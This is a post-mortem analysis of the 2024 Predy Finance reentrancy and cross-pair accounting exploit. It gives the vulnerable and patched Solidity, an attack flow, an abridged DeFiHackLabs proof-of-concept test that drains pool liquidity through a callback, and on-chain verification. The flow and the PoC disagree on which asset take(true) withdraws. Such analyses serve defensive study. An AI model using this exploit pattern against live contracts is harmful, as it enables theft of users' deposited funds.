# Predy Finance — Cross-Pair Accounting Discrepancy (Accounting Error) Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05-14 (07:41:28 UTC) |
| **Protocol** | Predy Finance |
| **Chain** | Arbitrum |
| **Loss** | ~$464,000 (83.91 WETH + 219,585.74 USDC) |
| **Attacker** | [0x76B0...D008](https://arbiscan.io/address/0x76b02ab483482740248e2ab38b5a879a31c6d008) |
| **Attack Contract** | [0xb797...0149](https://arbiscan.io/address/0xb79714634895f52a4f6a75eceb58c96246370149) |
| **Attack Tx** | [0xbe16...f50f](https://arbiscan.io/tx/0xbe163f651d23f0c9e4d4a443c0cc163134a31a1c2761b60188adcfd33178f50f) |
| **Vulnerable Contract** | [PredyPool 0x9215...8613](https://arbiscan.io/address/0x9215748657319b17fecb2b5d086a3147bfbc8613) |
| **Attack Block** | 211,107,442 |
| **Root Cause** | Cross-pair liquidity theft inside `trade()` callback (accounting validation ordering error) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/PredyFinance_exp.sol) |

---

## 1. Vulnerability Overview

Predy Finance is a perpetual DEX / options protocol operating on Arbitrum, where a single `PredyPool` contract shares and manages liquidity across multiple token pairs.

The core vulnerability arose from the combination of three flaws:

1. **Pair Isolation Failure**: Unlimited duplicate pair creation was permitted for the same token combination (USDC/WETH), allowing an attacker to register a pair that had access to the entire pool's liquidity.

2. **Reentrancy via Callback**: The `trade()` function lacked a `nonReentrant` modifier, enabling re-invocation of `take()` and `supply()` during the `predyTradeAfterCallback` execution. The lock owner (`locker`) is set to the attacker's contract upon callback entry, granting it passage through the `onlyByLocker` gate.

3. **Post-Callback Validation Misuse**: The balance health check (`PositionCalculator.checkSafe()`) is only performed **after** the callback. By draining liquidity from existing pairs and re-supplying it to the new pair inside the callback, the total pool balance appears unchanged at validation time, allowing the check to pass.

---

## 2. Vulnerable Code Analysis

### 2.1 `trade()` — Missing `nonReentrant` (Core Vulnerability)

```solidity
// ❌ Vulnerable code — trade() function missing nonReentrant
function trade(
    TradeParams memory tradeParams,
    bytes memory settlementData
) external returns (TradeResult memory tradeResult) {
    // [1] Lock initialization: msg.sender (attacker contract) becomes the locker
    DataType.PairStatus storage pairStatus = _getPairStatus(tradeParams.pairId);
    Locks.initialize(globalData, msg.sender);   // ❌ locker = attacker

    // [2] Actual position settlement (internal logic)
    tradeResult = TradeLogic.trade(globalData, tradeParams, settlementData);

    // [3] Callback invocation — attacker code executes at this point
    // ❌ No nonReentrant, so take/supply can be called inside the callback
    IPredyTradeCallback(msg.sender).predyTradeAfterCallback(tradeParams, tradeResult);

    // [4] Validation — only performed after the callback completes
    PositionCalculator.checkSafe(globalData, pairStatus, tradeParams.vaultId);
    // ❌ Funds have already moved by this point, but the balance sum appears unchanged
}
```

Fixed code:

```solidity
// ✅ Fixed code — nonReentrant added + pre-callback validation
function trade(
    TradeParams memory tradeParams,
    bytes memory settlementData
) external nonReentrant returns (TradeResult memory tradeResult) {  // ✅ Reentrancy lock
    DataType.PairStatus storage pairStatus = _getPairStatus(tradeParams.pairId);
    Locks.initialize(globalData, msg.sender);

    tradeResult = TradeLogic.trade(globalData, tradeParams, settlementData);

    // ✅ Snapshot pair-internal state before callback
    uint256 baseBalanceBefore = IERC20(pairStatus.baseToken).balanceOf(address(this));
    uint256 quoteBalanceBefore = IERC20(pairStatus.quoteToken).balanceOf(address(this));

    IPredyTradeCallback(msg.sender).predyTradeAfterCallback(tradeParams, tradeResult);

    // ✅ Verify that balances have not decreased after callback (prevents cross-pair fund drain)
    require(
        IERC20(pairStatus.baseToken).balanceOf(address(this)) >= baseBalanceBefore,
        "base balance decreased"
    );

    PositionCalculator.checkSafe(globalData, pairStatus, tradeParams.vaultId);
}
```

**Issue**: Validation is only performed after the callback, and during the callback any pair's funds can be withdrawn via `take()`, meaning balance-sum-based validation fails to detect cross-pair theft.

---

### 2.2 `registerPair()` — Duplicate Pair Registration Allowed

```solidity
// ❌ Vulnerable code — duplicate registration of the same token pair is possible
function registerPair(
    AddPairLogic.AddPairParams memory addPairParam
) external returns (uint256 pairId) {
    // ❌ Does not check whether the same token combination already exists
    pairId = AddPairLogic.addPair(globalData, uniswapFactory, addPairParam);
    // Attacker creates a pair with poolOwner = address(this) → becomes the callback recipient
}
```

```solidity
// ✅ Fixed code — prevents duplicate pair registration
function registerPair(
    AddPairLogic.AddPairParams memory addPairParam
) external returns (uint256 pairId) {
    // ✅ Reverts if a pair with the same (marginId, quoteToken, uniswapPool) already exists
    bytes32 pairKey = keccak256(abi.encodePacked(
        addPairParam.marginId,
        addPairParam.uniswapPool
    ));
    require(!registeredPairs[pairKey], "pair already exists");
    registeredPairs[pairKey] = true;

    pairId = AddPairLogic.addPair(globalData, uniswapFactory, addPairParam);
}
```

**Issue**: Anyone could register a new pair with the same tokens as an existing liquidity pair, allowing the attacker to set `poolOwner` (callback recipient) to their own contract.

---

### 2.3 `take()` — No Cross-Pair Withdrawal Restriction

```solidity
// ❌ Vulnerable code — any locker can withdraw funds from arbitrary pairs
function take(
    bool isQuoteAsset,
    address to,
    uint256 amount
) external onlyByLocker {
    // ❌ Does not verify that the funds belong to the pairId currently being traded
    if (isQuoteAsset) {
        IERC20(quoteToken).safeTransfer(to, amount);
    } else {
        IERC20(baseToken).safeTransfer(to, amount);
    }
}
```

```solidity
// ✅ Fixed code — only allows withdrawal from the currently active pair
function take(
    bool isQuoteAsset,
    address to,
    uint256 amount
) external onlyByLocker {
    uint256 activePairId = globalData.lockData.activePairId;  // ✅ Track active pair ID
    DataType.PairStatus storage pairStatus = _getPairStatus(activePairId);

    // ✅ Verify withdrawal amount does not exceed the pair's available liquidity
    if (isQuoteAsset) {
        require(amount <= pairStatus.quotePool.totalAvailableAmount, "exceeds pair liquidity");
        IERC20(pairStatus.quoteToken).safeTransfer(to, amount);
    } else {
        require(amount <= pairStatus.basePool.totalAvailableAmount, "exceeds pair liquidity");
        IERC20(pairStatus.baseToken).safeTransfer(to, amount);
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker pre-deployed the attack contract (`0xb797...0149`) on 2024-03-29. On the day of the attack, a single transaction from the EOA (`0x76B0...D008`) calling the deployed contract's entry function completed the exploit.

### 3.2 Execution Phase

```
1. registerPair()  — Attacker contract registers a new USDC/WETH pair (id=3) with itself as poolOwner
                     (same token combination as existing pair id=1,2 — permitted)

2. trade()         — Opens a position with tradeAmount=0 on pairId=3 (zero cost)
                     └→ Locks.initialize(locker = attacker contract)  ← locker acquired

3. predyTradeAfterCallback() entered (attacker callback executes)
   │
   ├─ take(true, attacker, all USDC balance)
   │   └→ PredyPool → attacker: 219,585.74 USDC transferred  ← USDC drained from existing pairs
   │
   ├─ supply(pairId=3, false, full USDC)
   │   └→ attacker → PredyPool pair3: USDC re-supplied  ← pair3 LP tokens received
   │
   ├─ take(false, attacker, all WETH balance)
   │   └→ PredyPool → attacker: 83.91 WETH transferred    ← WETH drained from existing pairs
   │
   └─ supply(pairId=3, true, full WETH)
       └→ attacker → PredyPool pair3: WETH re-supplied  ← pair3 LP tokens received

4. PositionCalculator.checkSafe() — total balance unchanged → validation passes ✓ (cross-pair theft undetected)

5. withdraw(pairId=3, true, all WETH LP)   — pair3 LP burned → WETH withdrawn
6. withdraw(pairId=3, false, all USDC LP)  — pair3 LP burned → USDC withdrawn

Result: Attacker EOA ultimately receives 83.91 WETH + 219,585.74 USDC
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────┐
│  Attacker EOA               │
│  0x76B0...D008              │
└──────────────┬──────────────┘
               │ Single Tx call
               ▼
┌─────────────────────────────┐
│  Attack Contract            │
│  0xb797...0149              │
│                             │
│  [1] registerPair()         │─────────────────────────────────▶ ┌─────────────────────┐
│      poolOwner = self       │                                    │   PredyPool         │
│      pairId = 3 acquired    │                                    │   0x9215...8613     │
│                             │                                    │                     │
│  [2] trade(pairId=3,        │─────────────────────────────────▶ │  pair1: USDC/WETH   │
│       amount=0)             │                                    │  pair2: USDC/WETH   │
│                             │◀ predyTradeAfterCallback()        │  pair3: USDC/WETH ← │
│  ┌──────────────────────┐   │                                    │  (attacker-owned)   │
│  │ CALLBACK (reentrancy) │   │                                    └─────────────────────┘
│  │                      │   │
│  │ [3a] take(all USDC) ──┼───┼───▶ 219,585 USDC → attacker
│  │ [3b] supply(USDC) ───┼───┼───▶ attacker USDC → pair3
│  │ [3c] take(all WETH) ──┼───┼───▶ 83.91 WETH  → attacker
│  │ [3d] supply(WETH) ───┼───┼───▶ attacker WETH → pair3
│  └──────────────────────┘   │      (total pool balance unchanged → checkSafe() passes)
│                             │
│  [4] withdraw(pair3, WETH) ─┼───▶ pair3 LP → WETH withdrawn
│  [5] withdraw(pair3, USDC) ─┼───▶ pair3 LP → USDC withdrawn
└─────────────────────────────┘
               │
               ▼
┌─────────────────────────────┐
│  Attacker Final Proceeds    │
│  83.91 WETH (~$252K)        │
│  219,585.74 USDC (~$220K)   │
│  Total: ~$464K              │
└─────────────────────────────┘
```

### 3.4 Results

| Field | Value |
|------|-----|
| WETH Stolen | 83.91 WETH (≈$252,000) |
| USDC Stolen | 219,585.74 USDC (≈$220,000) |
| Total Loss | ≈$464,000 |
| Gas Used | 4,383,107 gas |
| Attack Duration | Single transaction (~seconds) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

contract PredyFinance is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 211_107_441;  // Block immediately before attack
    IERC20 USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IPredyPool predyPool = IPredyPool(0x9215748657319B17fecb2b5D086A3147BFBC8613);

    function testExploit() public balanceLog {
        // [Setup] approve — in the actual attack, performed by the pre-deployed contract
        USDC.approve(address(predyPool), type(uint256).max);
        WETH.approve(address(predyPool), type(uint256).max);

        // [Step 1] Register a new USDC/WETH pair with attacker contract as poolOwner
        //          → Acquire pairId=3 (same tokens as existing pairs 1,2 — duplicates permitted)
        AddPairLogic.AddPairParams memory addPairParam = AddPairLogic.AddPairParams({
            marginId: address(WETH),
            poolOwner: address(this),          // Attacker contract is poolOwner
            uniswapPool: address(0xC6962004...),
            priceFeed: address(this),          // Attacker also provides price (getSqrtPrice)
            whitelistEnabled: false,
            fee: 0,
            // ... riskParams omitted
        });
        uint256 pairId = predyPool.registerPair(addPairParam);

        // [Step 2] Open position with tradeAmount=0 → triggers callback
        //          locker = address(this) is set at this point
        IPredyPool.TradeParams memory tradeParams = IPredyPool.TradeParams({
            pairId: pairId, vaultId: 0,
            tradeAmount: 0, tradeAmountSqrt: 0, extraData: ""
        });
        predyPool.trade(tradeParams, "");   // ❌ No nonReentrant

        // [Step 4] Withdraw all LP tokens supplied to pair3 during callback
        predyPool.withdraw(pairId, true, WETH.balanceOf(address(predyPool)));
        predyPool.withdraw(pairId, false, USDC.balanceOf(address(predyPool)));
    }

    // [Step 3] Callback invoked by trade() — core theft logic
    function predyTradeAfterCallback(
        IPredyPool.TradeParams memory tradeParams,
        IPredyPool.TradeResult memory tradeResult
    ) external {
        // locker = address(this) → passes take() onlyByLocker check

        // Drain all WETH from existing pairs (pair1, pair2) and re-supply to pair3
        predyPool.take(true, address(this), WETH.balanceOf(address(predyPool)));
        predyPool.supply(tradeParams.pairId, true, WETH.balanceOf(address(this)));

        // Drain all USDC from existing pairs and re-supply to pair3
        predyPool.take(false, address(this), USDC.balanceOf(address(predyPool)));
        predyPool.supply(tradeParams.pairId, false, USDC.balanceOf(address(this)));
        // ❌ Total pool balance here = same as before → checkSafe() passes
    }

    // Function registered by attacker as priceFeed (returns arbitrary price)
    function getSqrtPrice() external view returns (uint256) {
        return 40_000_000_000;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Cross-pair reentrancy (take/supply inside callback) | CRITICAL | CWE-841 | `01_reentrancy.md` |
| V-02 | Post-callback validation misuse (Check-Effects violation) | CRITICAL | CWE-696 | `11_logic_error.md` |
| V-03 | Unrestricted pair creation (missing access control) | HIGH | CWE-284 | `03_access_control.md` |
| V-04 | Accounting scope error (cross-pair balance commingling) | HIGH | CWE-682 | `16_accounting_sync.md` |

### V-01: Cross-Pair Reentrancy (take/supply inside callback)
- **Description**: The `trade()` function lacks `nonReentrant`, allowing `take()` and `supply()` to be re-invoked during callback execution. Upon callback entry, `locker` is set to `msg.sender` (the attacker), bypassing the `onlyByLocker` control.
- **Impact**: The entire pool liquidity (sum of all pairs) can be stolen in a single transaction.
- **Attack Condition**: Attacker contract implements `predyTradeAfterCallback` and can create an arbitrary pair via `registerPair`.

### V-02: Post-Callback Validation Misuse (Check-Effects Violation)
- **Description**: `checkSafe()` executes only **after** the callback. If funds are drained from existing pairs and immediately re-supplied to the same contract within the callback, the total balance remains unchanged, allowing the check to pass.
- **Impact**: Balance-based health checks fail to detect cross-pair fund movements.
- **Attack Condition**: V-01 and V-03 are required prerequisites.

### V-03: Unrestricted Pair Creation (Missing Access Control)
- **Description**: `registerPair()` has no whitelist or deduplication check, allowing anyone to register a new pair with the same tokens as an existing pair and set `poolOwner` (callback recipient) to an arbitrary address.
- **Impact**: Attacker gains callback control, establishing the reentrancy vector.
- **Attack Condition**: None (permissionless function).

### V-04: Accounting Scope Error (Cross-Pair Balance Commingling)
- **Description**: The `take()` function does not enforce the available liquidity limit of "the pair currently being traded" — it allows withdrawal of the contract's entire holdings. This violates the principle of per-pair independent accounting.
- **Impact**: Funds from other pairs can be stolen within the trade context of a specific pair.
- **Attack Condition**: Requires locker privilege (V-01 must precede).

---

## 6. Remediation Recommendations

### Immediate Actions

**[1] Add `nonReentrant` to `trade()`**

```solidity
// ✅ Apply ReentrancyGuard or equivalent lock
function trade(
    TradeParams memory tradeParams,
    bytes memory settlementData
) external nonReentrant returns (TradeResult memory tradeResult) {
    // ...
}
```

**[2] Add pair-scoped restriction to `take()`**

```solidity
// ✅ Limit withdrawals to the available liquidity of the active pair
function take(bool isQuoteAsset, address to, uint256 amount) external onlyByLocker {
    uint256 activePairId = globalData.lockData.activePairId;
    DataType.PairStatus storage pair = _getPairStatus(activePairId);
    uint256 available = isQuoteAsset
        ? pair.quotePool.totalAvailableAmount
        : pair.basePool.totalAvailableAmount;
    require(amount <= available, "PredyPool: insufficient pair liquidity");
    // ...
}
```

**[3] Prevent duplicate pair registration in `registerPair()`**

```solidity
// ✅ Block duplicate registration of the same (uniswapPool) combination
mapping(address => bool) public registeredUniswapPools;

function registerPair(AddPairLogic.AddPairParams memory params) external returns (uint256) {
    require(!registeredUniswapPools[params.uniswapPool], "pair already registered");
    registeredUniswapPools[params.uniswapPool] = true;
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Cross-pair reentrancy | Apply `ReentrancyGuard` to all functions that invoke external callbacks |
| V-02 Post-callback validation | Follow CEI (Checks-Effects-Interactions) pattern; snapshot state before callback, validate delta after callback |
| V-03 Unrestricted pair creation | Require whitelist or governance approval for `registerPair()`; add deduplication mapping |
| V-04 Accounting scope error | Track per-pair balances independently; manage per-pair `reserved` balances rather than contract-wide totals |
| Overall | Reconsider monolithic pool architecture — consider introducing per-pair independent contracts or isolated sub-contexts |

---

## 7. Lessons Learned

1. **Functions that expose callbacks must always be reentrancy-protected**: When a protocol allows callbacks from external contracts (e.g., `predyTradeAfterCallback`, `uniswapV3MintCallback`), `nonReentrant` must be applied to the entire enclosing function. If protocol-internal functions can be called from within a callback, a reentrancy vector exists.

2. **Validation must occur *before* withdrawals are permitted (CEI principle)**: The "validate after callback" pattern cannot detect state changes that occur during the callback. Balance health checks must be performed **before** external interactions (callbacks/external calls), or the state delta before and after the callback must be compared.

3. **Pair isolation is mandatory in shared pool architectures**: When a single contract manages liquidity across multiple pairs, accounting must be isolated so that one pair's trade context cannot access another pair's funds. Functions like `take()` should only permit amounts up to the "currently active pair's" limit.

4. **Permissionless pair registration must be designed assuming isolation failures**: In an architecture where anyone can create a pair, it must be guaranteed that a new pair cannot access the funds of existing pairs. In particular, designs where `poolOwner` becomes the callback recipient carry a high inherent risk.

5. **Review similar historical cases**: The same pattern recurred in Cream Finance ($130M, ERC777 reentrancy) and Fei/Rari ($80M, cross-contract reentrancy). Protocols with complex callback chains — like perpetual DEXes — must scrutinize reentrancy risk with particular care.

---

## 8. On-Chain Verification

On-chain verification against the public Arbitrum RPC (arb1.arbitrum.io/rpc) was not possible because historical state around the attack block had been pruned. Alternative verification was performed through analysis of inbound transaction event logs.

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Expected | On-Chain Actual (Transfer events) | Match |
|------|-----------|-------------------------------|------|
| WETH stolen | 83.9 WETH | 83.910994929830029848 WETH | ✅ |
| USDC stolen | 219,585 USDC | 219,585.737814 USDC | ✅ |
| Total loss | ~$464K | ~$464K | ✅ |
| Attack block | 211,107,441 | 211,107,442 (block containing Tx) | ✅ |

### 8.2 On-Chain Event Log Sequence (Transfer Events)

| Order | Contract | From | To | Amount | Meaning |
|------|---------|------|----|------|------|
| 1 | WETH | PredyPool → Attack Contract | 83.91 WETH | take(WETH) |
| 2 | WETH | Attack Contract → PredyPool | 83.91 WETH | supply(pair3, WETH) |
| 3 | WETH LP (0x3dd6) | Mint (0x00 → Attack Contract) | 83.91 WETH | LP token minted |
| 4 | USDC | PredyPool → Attack Contract | 219,585.74 USDC | take(USDC) |
| 5 | USDC | Attack Contract → PredyPool | 219,585.74 USDC | supply(pair3, USDC) |
| 6 | USDC LP (0x0b9f) | Mint (0x00 → Attack Contract) | 219,585.74 USDC | LP token minted |
| 7 | USDC LP (0x0b9f) | Burn (Attack Contract → 0x00) | 219,585.74 USDC | LP burned (withdraw) |
| 8 | WETH | PredyPool → Attack Contract | 83.91 WETH | WETH withdrawn (withdraw) |
| 9 | WETH LP (0x3dd6) | Burn (Attack Contract → 0x00) | 83.91 WETH | LP burned (withdraw) |
| 10 | USDC | PredyPool → Attacker EOA | 219,585.74 USDC | Final profit transfer |
| 11 | WETH | PredyPool → Attacker EOA | 83.91 WETH | Final profit transfer |

### 8.3 On-Chain Verified Addresses

| Contract | Address | Role |
|---------|------|------|
| PredyPool | [0x9215...8613](https://arbiscan.io/address/0x9215748657319b17fecb2b5d086a3147bfbc8613) | Vulnerable contract |
| Attack Contract | [0xb797...0149](https://arbiscan.io/address/0xb79714634895f52a4f6a75eceb58c96246370149) | Exploit executor |
| WETH LP (pair3) | [0x3dd6...aba2](https://arbiscan.io/address/0x3dd636919d4180b59d9225370cb84f1ba849aba2) | LP token for attacker-created pair |
| USDC LP (pair3) | [0x0b9f...599f](https://arbiscan.io/address/0x0b9f4dfb6eb2a8c2f26e98c4538422e6b8c4599f) | LP token for attacker-created pair |
| WETH | [0x82aF...bab1](https://arbiscan.io/address/0x82aF49447D8a07e3bd95BD0d56f35241523fBab1) | Wrapped Ether |
| USDC | [0xaf88...5831](https://arbiscan.io/address/0xaf88d065e77c8cC2239327C5EDb3A432268e5831) | Native USDC |

---

## References

- [Predy Finance Official Post-Mortem (Medium)](https://predyfinance.medium.com/postmortem-report-on-the-details-of-the-events-of-may-14-2024-8690508c820b)
- [Neptune Mutual Analysis](https://neptunemutual.com/blog/breaking-down-the-predy-finance-hack/)
- [Verichains In-Depth Analysis](https://blog.verichains.io/p/predy-finance-attack-how-a-liquidity)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/PredyFinance_exp.sol)
- [Arbiscan Attack Tx](https://arbiscan.io/tx/0xbe163f651d23f0c9e4d4a443c0cc163134a31a1c2761b60188adcfd33178f50f)

---

*Written: 2026-04-11 | Analyst: gegul_x7950 | Skill: incident-analysis*